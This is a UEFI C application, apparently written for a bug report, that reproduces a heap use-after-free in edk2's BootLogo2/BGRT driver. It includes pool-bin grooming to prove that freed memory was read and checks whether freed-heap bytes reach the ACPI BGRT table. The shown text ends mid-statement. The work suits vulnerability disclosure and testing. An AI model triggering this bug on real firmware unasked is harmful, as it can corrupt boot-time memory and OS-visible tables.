/** @file
  Reproducer for a heap use-after-free in edk2's BootGraphicsResourceTableDxe.

  MdeModulePkg/Universal/Acpi/BootGraphicsResourceTableDxe/BootGraphicsResourceTableDxe.c

    GetBootLogo2 :398   *BltBuffer = mLogoBltBuffer;     <- returns the driver's own pointer
    SetBootLogo2 :319     if (mLogoBltBuffer != NULL) {
                 :320       FreePool (mLogoBltBuffer);
                 :321       mLogoBltBuffer = NULL; }
                 :327   mLogoBltBuffer = AllocateCopyPool (BufferSize, BltBuffer);

  A caller that hands the pointer GetBootLogo2 returned back to SetBootLogo2 makes line
  320 free the memory that line 327 then copies FROM. Nothing in
  MdeModulePkg/Include/Protocol/BootLogo2.h forbids that call: the only constraint stated
  on the returned buffer is that it "must not be modified or freed" (:62-64), and
  SetBootLogo2's own documentation for BltBuffer says just "The BLT buffer for logo drawn
  on screen".

  This application performs exactly that sequence and then decides, from observables, which
  of three things happened. It never prints a verdict it has not evidence for.

    REPRODUCED-OBSERVED   the copy's source was a block that was on the free list at the
                          moment of the read, and the bytes it read were not the ones the
                          PoC had put there.
    REPRODUCED-UNCHANGED  the free-then-read sequence executed and the source block was
                          free at the time of the read, but the bytes were unchanged.
    RECYCLED              the allocator handed the freed block straight back, so the copy
                          read its own fresh allocation. Nothing is observable from
                          outside the driver on this build.
    ABSENT                the driver is not present / the protocol is not installed.
    INCONCLUSIVE          the driver holds no buffer after the call, so what the copy
                          produced cannot be read back at all.

  How each observable is obtained is spelled out next to the code that takes it, and
  echoed into the report so a reader does not have to trust this comment.

  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiApplicationEntryPoint.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/PrintLib.h>

#include <Protocol/BootLogo2.h>
#include <Protocol/LoadedImage.h>
#include <Protocol/SimpleFileSystem.h>

#include <Guid/Acpi.h>

#include <IndustryStandard/Acpi.h>
#include <IndustryStandard/Bmp.h>

//
// The two logo geometries. What matters is not the pixel count but which pool bin each
// size lands in: MdeModulePkg/Core/Dxe/Mem/Pool.c keeps a free list per bin
//
//   mPoolSizeTable[] = { 128, 256, 384, 640, 1024, 1664, 2688, 4352, ... }
//
// and the index is chosen from (requested size + POOL_OVERHEAD), POOL_OVERHEAD being 40
// on X64. 16x16 pixels is 1024 bytes -> 1064 -> bin 5 (1664). 8x8 is 256 bytes -> 296 ->
// bin 2 (384). Freeing into bin 5 and allocating out of bin 2 is what stops the allocator
// from handing the just-freed block straight back, which is the case in which a real
// use-after-free is invisible from outside. See PrimeDestinationBin() below.
//
#define LOGO1_WIDTH   16
#define LOGO1_HEIGHT  16
#define LOGO2_WIDTH   8
#define LOGO2_HEIGHT  8

#define LOGO1_BYTES  ((UINTN)LOGO1_WIDTH * LOGO1_HEIGHT * sizeof (EFI_GRAPHICS_OUTPUT_BLT_PIXEL))
#define LOGO2_BYTES  ((UINTN)LOGO2_WIDTH * LOGO2_HEIGHT * sizeof (EFI_GRAPHICS_OUTPUT_BLT_PIXEL))

//
// How many blocks of the destination bin to seed. The allocator pops the head of the free
// list, so one would do; eight is margin against an unrelated allocation -- a timer
// notification, say -- landing between the seeding and the call and taking one.
//
#define PRIME_COUNT  8

//
// Pattern byte for offset i. 0x21..0x60 -- printable, position dependent with a period of
// 64 bytes (16 pixels), and it contains neither 0x00 nor 0xAF. 0xAF is
// PcdDebugClearMemoryValue, the byte DxeCore writes over a pool block when
// DEBUG_PROPERTY_CLEAR_MEMORY_ENABLED is set in PcdDebugPropertyMask (OvmfPkgX64.dsc
// sets the mask to 0x2F, so that bit is on in OVMF). Keeping it out of the pattern is
// what lets the report say "these bytes are the allocator's free poison, not mine".
//
#define PATTERN_BYTE(i)  ((UINT8)(0x21 + ((i) & 0x3F)))

//
// Byte written into the seeded destination blocks before they are freed, so a destination
// that was never written by the copy at all can be told apart from one that was.
//
#define PRIME_BYTE  0x5A

#define POOL_FREE_POISON  0xAF

#define LOG_MAX  (64 * 1024)

STATIC CHAR8   *mLog      = NULL;
STATIC UINTN   mLogLen    = 0;
STATIC BOOLEAN mLogFull   = FALSE;

//
// Report a line to the console and into the in-memory log, which is appended to
// \bootlogo2-uaf.log on the volume this application was loaded from. The console is for a
// human at a UEFI shell; the file is what makes a headless QEMU or a USB key on a real
// machine produce something to read afterwards.
//
STATIC
VOID
EFIAPI
Rpt (
  IN CONST CHAR8  *Format,
  ...
  )
{
  CHAR8    Line[512];
  VA_LIST  Marker;
  UINTN    Length;

  VA_START (Marker, Format);
  AsciiVSPrint (Line, sizeof (Line), Format, Marker);
  VA_END (Marker);

  AsciiPrint ("%a", Line);

  if ((mLog == NULL) || mLogFull) {
    return;
  }

  Length = AsciiStrLen (Line);
  if ((mLogLen + Length + 1) > LOG_MAX) {
    mLogFull = TRUE;
    return;
  }

  CopyMem (mLog + mLogLen, Line, Length);
  mLogLen        += Length;
  mLog[mLogLen]   = '\0';
}

STATIC
VOID
HexDump (
  IN CONST CHAR8  *Label,
  IN CONST UINT8  *Bytes,
  IN UINTN        Count
  )
{
  CHAR8  Line[128];
  UINTN  Index;
  UINTN  Column;
  UINTN  Offset;

  for (Index = 0; Index < Count; Index += 16) {
    Offset = 0;
    for (Column = 0; (Column < 16) && ((Index + Column) < Count); Column++) {
      Offset += AsciiSPrint (
                  Line + Offset,
                  sizeof (Line) - Offset,
                  "%02x ",
                  Bytes[Index + Column]
                  );
    }

    Rpt ("  %a +%04x: %a\r\n", Label, (UINT32)Index, Line);
  }
}

//
// How many of the Count bytes equal Value?
//
STATIC
UINTN
CountBytes (
  IN CONST UINT8  *Bytes,
  IN UINTN        Count,
  IN UINT8        Value
  )
{
  UINTN  Index;
  UINTN  Found;

  Found = 0;
  for (Index = 0; Index < Count; Index++) {
    if (Bytes[Index] == Value) {
      Found++;
    }
  }

  return Found;
}

//
// Does every byte of Bytes equal Value?
//
STATIC
BOOLEAN
AllBytesAre (
  IN CONST UINT8  *Bytes,
  IN UINTN        Count,
  IN UINT8        Value
  )
{
  return (BOOLEAN)(CountBytes (Bytes, Count, Value) == Count);
}

//
// Index of the first byte that is not the pattern byte for its offset, or Count if they
// all match.
//
STATIC
UINTN
FirstPatternMismatch (
  IN CONST UINT8  *Bytes,
  IN UINTN        Count
  )
{
  UINTN  Index;

  for (Index = 0; Index < Count; Index++) {
    if (Bytes[Index] != PATTERN_BYTE (Index)) {
      return Index;
    }
  }

  return Count;
}

STATIC
VOID
FillPattern (
  OUT UINT8  *Bytes,
  IN  UINTN  Count
  )
{
  UINTN  Index;

  for (Index = 0; Index < Count; Index++) {
    Bytes[Index] = PATTERN_BYTE (Index);
  }
}

/**
  Put PRIME_COUNT blocks of the second call's size on the pool free list.

  Without this the two SetBootLogo2 calls can use the same size, the free and the
  allocation hit the same bin, the allocator returns the block it was just handed, and the
  copy reads its own fresh allocation -- a real use-after-free with nothing observable
  outside the driver. Seeding the destination bin makes the allocation come from somewhere
  this application can name, which is what turns "the content looks wrong" into "the
  source and the destination are different blocks".

  The blocks are freed youngest-first so that Blocks[0] ends up at the head of the free
  list: MdeModulePkg/Core/Dxe/Mem/Pool.c inserts at the head and allocates from the head.

  @param[out] Blocks  Receives the PRIME_COUNT addresses, still meaningful after the free
                      because only their values are compared afterwards -- never read.
**/
STATIC
VOID
PrimeDestinationBin (
  OUT VOID  **Blocks
  )
{
  UINTN  Index;

  for (Index = 0; Index < PRIME_COUNT; Index++) {
    Blocks[Index] = AllocatePool (LOGO2_BYTES);
    if (Blocks[Index] != NULL) {
      SetMem (Blocks[Index], LOGO2_BYTES, PRIME_BYTE);
    }
  }

  for (Index = PRIME_COUNT; Index > 0; Index--) {
    if (Blocks[Index - 1] != NULL) {
      FreePool (Blocks[Index - 1]);
    }
  }
}

/**
  Find the ACPI Boot Graphics Resource Table.

  @param[out] Bgrt  Receives a pointer to the installed BGRT, or NULL.

  @retval EFI_SUCCESS  A BGRT was found.
**/
STATIC
EFI_STATUS
FindBgrt (
  OUT EFI_ACPI_5_0_BOOT_GRAPHICS_RESOURCE_TABLE  **Bgrt
  )
{
  EFI_STATUS                                        Status;
  EFI_ACPI_2_0_ROOT_SYSTEM_DESCRIPTION_POINTER      *Rsdp;
  EFI_ACPI_DESCRIPTION_HEADER                       *Xsdt;
  EFI_ACPI_DESCRIPTION_HEADER                       *Table;
  UINT64                                            *Entry;
  UINTN                                             Count;
  UINTN                                             Index;

  *Bgrt = NULL;
  Rsdp  = NULL;

  Status = EfiGetSystemConfigurationTable (&gEfiAcpiTableGuid, (VOID **)&Rsdp);
  if (EFI_ERROR (Status) || (Rsdp == NULL)) {
    Status = EfiGetSystemConfigurationTable (&gEfiAcpi10TableGuid, (VOID **)&Rsdp);
  }

  if (EFI_ERROR (Status) || (Rsdp == NULL)) {
    return EFI_NOT_FOUND;
  }

  if (Rsdp->XsdtAddress == 0) {
    return EFI_UNSUPPORTED;
  }

  Xsdt  = (EFI_ACPI_DESCRIPTION_HEADER *)(UINTN)Rsdp->XsdtAddress;
  if (Xsdt->Length < sizeof (EFI_ACPI_DESCRIPTION_HEADER)) {
    return EFI_VOLUME_CORRUPTED;
  }

  Count = (Xsdt->Length - sizeof (EFI_ACPI_DESCRIPTION_HEADER)) / sizeof (UINT64);
  Entry = (UINT64 *)((UINT8 *)Xsdt + sizeof (EFI_ACPI_DESCRIPTION_HEADER));

  for (Index = 0; Index < Count; Index++) {
    if (Entry[Index] == 0) {
      continue;
    }

    Table = (EFI_ACPI_DESCRIPTION_HEADER *)(UINTN)Entry[Index];
    if (Table->Signature == EFI_ACPI_5_0_BOOT_GRAPHICS_RESOURCE_TABLE_SIGNATURE) {
      *Bgrt = (EFI_ACPI_5_0_BOOT_GRAPHICS_RESOURCE_TABLE *)Table;
      return EFI_SUCCESS;
    }
  }

  return EFI_NOT_FOUND;
}

/**
  Print the installed BGRT and classify the first bytes of the image it points at.

  The BGRT is the reason this matters past a use-after-free. BgrtReadyToBootEventNotify
  feeds mLogoBltBuffer to TranslateGopBltToBmp (:484) and stores the result as
  ImageAddress (:503), and the operating system reads that table. The table is only
  rebuilt when ReadyToBoot is signalled, so the bytes this PoC leaves in mLogoBltBuffer
  reach the BGRT on the NEXT boot attempt, not during this run -- which is why the
  supplied ESP relaunches the application once from the shell.

  @param[in] When  "before" or "after", for the report.
**/
STATIC
VOID
ReportBgrt (
  IN CONST CHAR8  *When
  )
{
  EFI_STATUS                                 Status;
  EFI_ACPI_5_0_BOOT_GRAPHICS_RESOURCE_TABLE  *Bgrt;
  BMP_IMAGE_HEADER                           *Bmp;
  UINT8                                      *Pixels;
  UINTN                                      Poison;

  Status = FindBgrt (&Bgrt);
  if (EFI_ERROR (Status)) {
    Rpt ("BGRT (%a): not found (%r)\r\n", When, Status);
    return;
  }

  Rpt (
    "BGRT (%a): at 0x%016lx  Status=0x%04x ImageType=0x%04x ImageAddress=0x%016lx"
    " Offset=(%u,%u)\r\n",
    When,
    (UINT64)(UINTN)Bgrt,
    (UINT32)Bgrt->Status,
    (UINT32)Bgrt->ImageType,
    Bgrt->ImageAddress,
    Bgrt->ImageOffsetX,
    Bgrt->ImageOffsetY
    );

  if (Bgrt->ImageAddress == 0) {
    Rpt ("BGRT (%a): ImageAddress is 0 -- no image published\r\n", When);
    return;
  }

  Bmp = (BMP_IMAGE_HEADER *)(UINTN)Bgrt->ImageAddress;
  if ((Bmp->CharB != 'B') || (Bmp->CharM != 'M')) {
    Rpt ("BGRT (%a): image does not start with 'BM'\r\n", When);
    return;
  }

  Rpt (
    "BGRT (%a): BMP %ux%u, %u bpp, image data at +0x%x, %u bytes\r\n",
    When,
    Bmp->PixelWidth,
    Bmp->PixelHeight,
    (UINT32)Bmp->BitPerPixel,
    Bmp->ImageOffset,
    Bmp->Size
    );

  Pixels = (UINT8 *)Bmp + Bmp->ImageOffset;
  HexDump ("bgrt-image", Pixels, 48);

  //
  // What can honestly be asserted about these bytes, and what cannot.
  //
  // TranslateGopBltToBmp drops the Reserved byte of every BLT pixel and writes the rows
  // bottom-up, so this PoC's 64-byte-period pattern does NOT survive into the BMP at the
  // same offsets: a byte-for-byte pattern comparison here would be meaningless and is
  // deliberately not made. A single repeated byte does survive both transformations,
  // which is why the pool free poison is the only thing named.
  //
  Poison = CountBytes (Pixels, 48, POOL_FREE_POISON);
  Rpt (
    "BGRT (%a): %u of the first 48 image bytes are 0x%02x\r\n",
    When,
    (UINT32)Poison,
    POOL_FREE_POISON
    );

  if (Poison == 48) {
    Rpt (
      "BGRT (%a): 0x%02x is PcdDebugClearMemoryValue, the byte DxeCore writes over a pool\r\n",
      When,
      POOL_FREE_POISON
      );
    Rpt (
      "BGRT (%a): block in CoreFreePoolI. Freed firmware heap has reached an ACPI table\r\n",
      When
      );
    Rpt ("BGRT (%a): the operating system reads.\r\n", When);
  } else if (Poison > 0) {
    Rpt (
      "BGRT (%a): some but not all of the sampled bytes are the pool free poison -- read\r\n",
      When
      );
    Rpt (
      "BGRT (%a): the dump above rather than trusting a one-line classification.\r\n",
      When
      );
  } else {
    Rpt (
      "BGRT (%a): no free poison in the sample. On a build that does not poison freed\r\n",
      When
      );
    Rpt (
      "BGRT (%a): pool memory this says nothing either way; see VERDICT above.\r\n",
      When
      );
  }
}

/**
  Open the root of the volume this image was loaded from.

  @param[out] Root  Receives the opened volume root. The caller closes it.
**/
STATIC
EFI_STATUS
OpenOwnVolume (
  IN  EFI_HANDLE         ImageHandle,
  OUT EFI_FILE_PROTOCOL  **Root
  )
{
  EFI_STATUS                       Status;
  EFI_LOADED_IMAGE_PROTOCOL        *Image;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL  *Fs;

  Status = gBS->HandleProtocol (
                  ImageHandle,
                  &gEfiLoadedImageProtocolGuid,
                  (VOID **)&Image
                  );
  if (EFI_ERROR (Status)) {
    return Status;
  }

  Status = gBS->HandleProtocol (
                  Image->DeviceHandle,
                  &gEfiSimpleFileSystemProtocolGuid,
                  (VOID **)&Fs
                  );
  if (EFI_ERROR (Status)) {
    return Status;
  }

  return Fs->OpenVolume (Fs, Root);
}

/**
  Is the opt-in marker file \BL2UAF.RTB present on the volume this image came from?

  BgrtReadyToBootEventNotify only rebuilds the BGRT when ReadyToBoot is signalled, and
  BDS has already signalled it once before this application is launched. So the bytes the
  use-after-free leaves in mLogoBltBuffer reach the ACPI table either on the next boot
  attempt or when something signals ReadyToBoot again.

  A marker file, and not a default, because signalling ReadyToBoot re-runs EVERY
  ReadyToBoot notification in the firmware. Under QEMU that is the only way to see the
  whole chain -- use-after-free, then BGRT -- inside a single boot, and the varstore is a
  throwaway copy. On a real machine those handlers are the platform's: at least one of
  them (BmSetMemoryTypeInformationVariable, in UefiBootManagerLib) writes an NVRAM
  variable, and a platform may lock hardware there. Without the marker this application
  touches no event at all and only reads the table back.
**/
STATIC
BOOLEAN
RepublishRequested (
  IN EFI_HANDLE  ImageHandle
  )
{
  EFI_STATUS         Status;
  EFI_FILE_PROTOCOL  *Root;
  EFI_FILE_PROTOCOL  *File;

  Status = OpenOwnVolume (ImageHandle, &Root);
  if (EFI_ERROR (Status)) {
    return FALSE;
  }

  Status = Root->Open (Root, &File, L"\\BL2UAF.RTB", EFI_FILE_MODE_READ, 0);
  if (!EFI_ERROR (Status)) {
    File->Close (File);
    Root->Close (Root);
    return TRUE;
  }

  Root->Close (Root);
  return FALSE;
}

/**
  Append the in-memory log to \bootlogo2-uaf.log on the volume this image came from.
**/
STATIC
VOID
WriteLogFile (
  IN EFI_HANDLE  ImageHandle
  )
{
  EFI_STATUS                       Status;
  EFI_LOADED_IMAGE_PROTOCOL        *Image;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL  *Fs;
  EFI_FILE_PROTOCOL                *Root;
  EFI_FILE_PROTOCOL                *File;
  UINTN                            Size;

  if ((mLog == NULL) || (mLogLen == 0)) {
    return;
  }

  Status = gBS->HandleProtocol (
                  ImageHandle,
                  &gEfiLoadedImageProtocolGuid,
                  (VOID **)&Image
                  );
  if (EFI_ERROR (Status)) {
    return;
  }

  Status = gBS->HandleProtocol (
                  Image->DeviceHandle,
                  &gEfiSimpleFileSystemProtocolGuid,
                  (VOID **)&Fs
                  );
  if (EFI_ERROR (Status)) {
    return;
  }

  Status = Fs->OpenVolume (Fs, &Root);
  if (EFI_ERROR (Status)) {
    return;
  }

  Status = Root->Open (
                   Root,
                   &File,
                   L"\\bootlogo2-uaf.log",
                   EFI_FILE_MODE_CREATE | EFI_FILE_MODE_WRITE | EFI_FILE_MODE_READ,
                   0
                   );
  if (EFI_ERROR (Status)) {
    AsciiPrint ("note: could not open \\bootlogo2-uaf.log (%r)\r\n", Status);
    Root->Close (Root);
    return;
  }

  //
  // Append, so successive runs accumulate -- the BGRT half of the demonstration needs the
  // record of the run before this one.
  //
  File->SetPosition (File, 0xFFFFFFFFFFFFFFFFULL);
  Size = mLogLen;
  File->Write (File, &Size, mLog);
  File->Flush (File);
  File->Close (File);
  Root->Close (Root);

  AsciiPrint ("report appended to \\bootlogo2-uaf.log (%u bytes)\r\n", (UINT32)mLogLen);
}

/**
  Application entry point.
**/
EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS                      Status;
  EDKII_BOOT_LOGO2_PROTOCOL       *BootLogo2;
  EFI_GRAPHICS_OUTPUT_BLT_PIXEL   *Mine;
  EFI_GRAPHICS_OUTPUT_BLT_PIXEL   *Held;
  EFI_GRAPHICS_OUTPUT_BLT_PIXEL   *After;
  VOID                            *Primed[PRIME_COUNT];
  VOID                            *Probe[PRIME_COUNT];
  UINTN                           DestX;
  UINTN                           DestY;
  UINTN                           Width;
  UINTN                           Height;
  UINTN                           Index;
  UINTN                           Mismatch;
  BOOLEAN                         SameBlock;
  BOOLEAN                         SourceWasFree;
  BOOLEAN                         DestWasSeeded;
  BOOLEAN                         ContentChanged;
  BOOLEAN                         Poisoned;
  INTN                            SeededIndex;
  INTN                            ProbeIndex;

  mLog = AllocateZeroPool (LOG_MAX);

  Rpt ("\r\n");
  Rpt ("=== BootLogo2 use-after-free reproducer ===============================\r\n");
  Rpt ("target: MdeModulePkg/Universal/Acpi/BootGraphicsResourceTableDxe\r\n");
  Rpt ("        GetBootLogo2 :398 hands out mLogoBltBuffer\r\n");
  Rpt ("        SetBootLogo2 :320 frees it, :327 copies from the caller's pointer\r\n");
  Rpt (
    "sizes : first logo %ux%u = %u bytes, second logo %ux%u = %u bytes\r\n",
    LOGO1_WIDTH,
    LOGO1_HEIGHT,
    (UINT32)LOGO1_BYTES,
    LOGO2_WIDTH,
    LOGO2_HEIGHT,
    (UINT32)LOGO2_BYTES
    );
  Rpt ("\r\n");

  //
  // 1. Is the driver here at all?
  //
  Status = gBS->LocateProtocol (
                  &gEdkiiBootLogo2ProtocolGuid,
                  NULL,
                  (VOID **)&BootLogo2
                  );
  if (EFI_ERROR (Status)) {
    Rpt ("[1] LocateProtocol(gEdkiiBootLogo2ProtocolGuid): %r\r\n", Status);
    Rpt ("\r\n");
    Rpt ("VERDICT: ABSENT -- this firmware does not install EDKII_BOOT_LOGO2_PROTOCOL,\r\n");
    Rpt ("         so the defect cannot be exercised here. Nothing was changed.\r\n");
    WriteLogFile (ImageHandle);
    return EFI_SUCCESS;
  }

  Rpt ("[1] protocol at 0x%016lx\r\n", (UINT64)(UINTN)BootLogo2);

  //
  // 2. What does the driver hold before anything is touched? BgrtReadyToBootEventNotify
  //    frees mLogoBltBuffer at :497 once it has built the BMP, so GetBootLogo2 at this
  //    point usually returns EFI_NOT_READY -- which is itself worth recording, because it
  //    says the driver has already run and published a table.
  //
  Held   = NULL;
  DestX  = 0;
  DestY  = 0;
  Width  = 0;
  Height = 0;
  Status = BootLogo2->GetBootLogo (BootLogo2, &Held, &DestX, &DestY, &Width, &Height);
  Rpt (
    "[2] GetBootLogo2 before we set anything: %r (buffer 0x%016lx, %ux%u)\r\n",
    Status,
    (UINT64)(UINTN)Held,
    (UINT32)Width,
    (UINT32)Height
    );

  //
  // On a platform that drew a logo the table below is the platform's own image. A second
  // run of this application sees the image rebuilt from whatever the previous run's
  // use-after-free left in mLogoBltBuffer, which is the OS-visible half of the defect.
  //
  ReportBgrt ("before");

  //
  // 3. Establish a logo this application owns and can recognise.
  //
  Mine = AllocatePool (LOGO1_BYTES);
  if (Mine == NULL) {
    Rpt ("[3] out of memory\r\n");
    WriteLogFile (ImageHandle);
    return EFI_OUT_OF_RESOURCES;
  }

  FillPattern ((UINT8 *)Mine, LOGO1_BYTES);

  Status = BootLogo2->SetBootLogo (
                        BootLogo2,
                        Mine,
                        0,
                        0,
                        LOGO1_WIDTH,
                        LOGO1_HEIGHT
                        );
  Rpt (
    "[3] SetBootLogo2(my buffer 0x%016lx, %ux%u): %r\r\n",
    (UINT64)(UINTN)Mine,
    LOGO1_WIDTH,
    LOGO1_HEIGHT,
    Status
    );
  if (EFI_ERROR (Status)) {
    Rpt ("    the driver refused a well-formed call; stopping\r\n");
    FreePool (Mine);
    WriteLogFile (ImageHandle);
    return Status;
  }

  //
  // 4. Take the driver's internal pointer. This is the pointer the header says must not be
  //    modified or freed -- and this PoC does neither.
  //
  Held   = NULL;
  Status = BootLogo2->GetBootLogo (BootLogo2, &Held, &DestX, &DestY, &Width, &Height);
  Rpt (
    "[4] GetBootLogo2: %r -> 0x%016lx (%ux%u at %u,%u)\r\n",
    Status,
    (UINT64)(UINTN)Held,
    (UINT32)Width,
    (UINT32)Height,
    (UINT32)DestX,
    (UINT32)DestY
    );
  if (EFI_ERROR (Status) || (Held == NULL)) {
    Rpt ("    no buffer returned; stopping\r\n");
    FreePool (Mine);
    WriteLogFile (ImageHandle);
    return EFI_ABORTED;
  }

  if (Held == Mine) {
    Rpt ("    NOTE: the driver returned the caller's own pointer, not a copy\r\n");
  } else {
    Rpt ("    the driver returned its own copy (my buffer was 0x%016lx)\r\n", (UINT64)(UINTN)Mine);
  }

  Mismatch = FirstPatternMismatch ((UINT8 *)Held, LOGO1_BYTES);
  Rpt (
    "    the copy matches my pattern for %u of %u bytes\r\n",
    (UINT32)Mismatch,
    (UINT32)LOGO1_BYTES
    );
  HexDump ("held", (UINT8 *)Held, 32);

  //
  // 5 and 6, with nothing between them.
  //
  // 5. Seed the bin the second call will allocate out of, so that the allocation cannot be
  //    the block the free just released. See PrimeDestinationBin.
  //
  // 6. THE DEFECT. Hand the driver back the pointer it gave us. Line 320 frees it; line
  //    327 copies LOGO2_BYTES out of it.
  //
  //    From here on Held must never be dereferenced by this application: after the call it
  //    is either freed memory or memory that belongs to the driver again.
  //
  // The seeding and the call have to be adjacent, which is why both lines are printed
  // before either is done. Every Rpt() goes through ConOut->OutputString and the console
  // drivers allocate pool, so a "[5] seeded ..." line printed BETWEEN the seeding and the
  // call can consume the seeded blocks again. Bin 2 would then be empty at the call and
  // CoreAllocatePoolI (Pool.c:451) would walk up to the next non-empty bin -- which is
  // the bin the free at :320 has just put the source block into -- and carve the
  // allocation out of the head of that very block. The destination would come back equal
  // to the source and the run could only ever report RECYCLED.
  //
  // The addresses printed in step [8] are what shows which of the two happened; do not
  // take this comment's word for it.
  //
  // IT HAS BEEN OBSERVED, and the run is kept because it is the only recorded example of
  // the outcome this PoC exists to tell apart from a real read of freed memory:
  // evidence/run-recycled-outcome.txt line 30 reads
  //
  //   [8] source block 0x000000007E905698, destination block 0x000000007E905698
  //
  // the same address twice -- the allocator handed the freed block straight back, so
  // CopyMem read its own fresh allocation and nothing stale was copied even though the
  // free at :320 certainly ran. A verdict of REPRODUCED-OBSERVED is only meaningful
  // because this outcome is distinguishable from it and has been seen.
  //
  Rpt ("[5] seeding the %u-byte bin with %u freed blocks\r\n", (UINT32)LOGO2_BYTES, PRIME_COUNT);
  Rpt (
    "[6] SetBootLogo2(the driver's own pointer 0x%016lx, %ux%u) -- this is the UAF\r\n",
    (UINT64)(UINTN)Held,
    LOGO2_WIDTH,
    LOGO2_HEIGHT
    );

  PrimeDestinationBin (Primed);
  Status = BootLogo2->SetBootLogo (
                        BootLogo2,
                        Held,
                        0,
                        0,
                        LOGO2_WIDTH,
                        LOGO2_HEIGHT
                        );

  //
  // Ask the allocator whether the source block is on the free list, HERE, with nothing
  // between this and the call. Requesting the source's own bin back and getting the
  // source's address out of it is only possible for a block that is free -- and the only
  // thing that could have freed it is the call above.
  //
  // This cannot wait until step [8]: every Rpt() reaches ConOut->OutputString and the
  // console drivers allocate pool, so a console allocation of the source's bin size takes
  // the block off the free list first and the probe can then only answer "no". Measured,
  // with the probe after the step-[6] narration: "the source address is handed out again
  // by AllocatePool(1024): no", on the same boot whose destination address proved the
  // block had in fact been freed.
  //
  ProbeIndex = -1;
  for (Index = 0; Index < PRIME_COUNT; Index++) {
    Probe[Index] = AllocatePool (LOGO1_BYTES);
    if ((Probe[Index] != NULL) && (Probe[Index] == (VOID *)Held)) {
      ProbeIndex = (INTN)Index;
    }
  }

  Rpt ("    returned %r\r\n", Status);
  Rpt ("    the seeded blocks were:\r\n");
  for (Index = 0; Index < PRIME_COUNT; Index++) {
    Rpt ("      0x%016lx\r\n", (UINT64)(UINTN)Primed[Index]);
  }

  //
  // 7. What does the driver hold now?
  //
  After  = NULL;
  Status = BootLogo2->GetBootLogo (BootLogo2, &After, &DestX, &DestY, &Width, &Height);
  Rpt (
    "[7] GetBootLogo2: %r -> 0x%016lx (%ux%u)\r\n",
    Status,
    (UINT64)(UINTN)After,
    (UINT32)Width,
    (UINT32)Height
    );
  if (EFI_ERROR (Status) || (After == NULL)) {
    Rpt ("\r\n");
    Rpt ("VERDICT: INCONCLUSIVE -- the driver has no buffer after the call, so the\r\n");
    Rpt ("         result of the copy cannot be read back. %r\r\n", Status);
    FreePool (Mine);
    WriteLogFile (ImageHandle);
    return EFI_SUCCESS;
  }

  //
  // 8a. Which block did the copy write into, and was the block it read from free? The
  //     second question was already asked, immediately after the call; this is where the
  //     two answers are put together.
  //
  SeededIndex = -1;
  for (Index = 0; Index < PRIME_COUNT; Index++) {
    if ((Primed[Index] != NULL) && ((VOID *)After == Primed[Index])) {
      SeededIndex = (INTN)Index;
    }
  }

  SameBlock      = (BOOLEAN)((VOID *)After == (VOID *)Held);
  DestWasSeeded  = (BOOLEAN)(SeededIndex >= 0);
  SourceWasFree  = (BOOLEAN)(ProbeIndex >= 0);

  Rpt ("[8] source block 0x%016lx, destination block 0x%016lx\r\n",
       (UINT64)(UINTN)Held, (UINT64)(UINTN)After);
  Rpt ("    destination is the same block as the source : %a\r\n", SameBlock ? "yes" : "no");
  if (DestWasSeeded) {
    Rpt ("    destination is one of the blocks step 5 freed : yes, index %d\r\n", (INT32)SeededIndex);
  } else {
    Rpt ("    destination is one of the blocks step 5 freed : no\r\n");
  }
  Rpt (
    "    the source address came back from AllocatePool(%u) right after the call: %a\r\n",
    (UINT32)LOGO1_BYTES,
    SourceWasFree ? "yes -- it was on the free list" : "no"
    );
  if (!SourceWasFree) {
    Rpt ("      (a 'no' here is weak evidence either way: anything that allocated out of\r\n");
    Rpt ("       that bin in between would take the block first. The address comparison\r\n");
    Rpt ("       above is the observable that decides the verdict.)\r\n");
  }

  for (Index = 0; Index < PRIME_COUNT; Index++) {
    if (Probe[Index] != NULL) {
      FreePool (Probe[Index]);
    }
  }

  //
  // 8b. What did the copy actually read? The destination is a live allocation owned by the
  //     driver, so reading it is legitimate, and its first LOGO2_BYTES are exactly what
  //     AllocateCopyPool copied out of the freed block.
  //
  Poisoned       = AllBytesAre ((UINT8 *)After, LOGO2_BYTES, POOL_FREE_POISON);
  Mismatch       = FirstPatternMismatch ((UINT8 *)After, LOGO2_BYTES);
  ContentChanged = (BOOLEAN)(Mismatch < LOGO2_BYTES);

  Rpt (
    "    the copied bytes match my pattern for %u of %u bytes\r\n",
    (UINT32)Mismatch,
    (UINT32)LOGO2_BYTES
    );
  Rpt (
    "    the copied bytes are all 0x%02x (the pool free poison): %a\r\n",
    POOL_FREE_POISON,
    Poisoned ? "yes" : "no"
    );
  HexDump ("copied", (UINT8 *)After, 48);

  //
  // 9. The verdict, stated only from the observables above.
  //
  Rpt ("\r\n");
  if (SameBlock) {
    Rpt ("VERDICT: RECYCLED\r\n");
    Rpt ("  The free-then-read sequence executed -- SetBootLogo2 cannot reach line 327\r\n");
    Rpt ("  without passing line 320 -- but the allocator returned the very block it had\r\n");
    Rpt ("  just released, so the copy read its own fresh allocation and nothing outside\r\n");
    Rpt ("  the driver can show it. The observable that decided this: the pointer\r\n");
    Rpt ("  GetBootLogo2 returns after the call is the same address it returned before.\r\n");
    if (Poisoned) {
      Rpt ("  The content is nevertheless all 0x%02x, because DxeCore poisons a pool block\r\n", POOL_FREE_POISON);
      Rpt ("  on both free and allocate, so the logo the firmware now holds is not the\r\n");
      Rpt ("  logo that was set.\r\n");
    }
  } else if (Poisoned) {
    Rpt ("VERDICT: REPRODUCED-OBSERVED\r\n");
    Rpt ("  The copy read memory that had been freed. The observables:\r\n");
    Rpt ("    - the destination (0x%016lx) is a different block from the source\r\n", (UINT64)(UINTN)After);
    Rpt ("      (0x%016lx)%a, so the allocation did not recycle the freed block;\r\n",
         (UINT64)(UINTN)Held,
         DestWasSeeded ? " and it is one of the blocks this PoC itself put on the free list" : "");
    Rpt ("    - step [4] read the source and found this PoC's pattern in it, and the\r\n");
    Rpt ("      pattern contains no 0x%02x byte at any offset;\r\n", POOL_FREE_POISON);
    Rpt ("    - all %u bytes the copy produced are 0x%02x, so the bytes CopyMem read were\r\n",
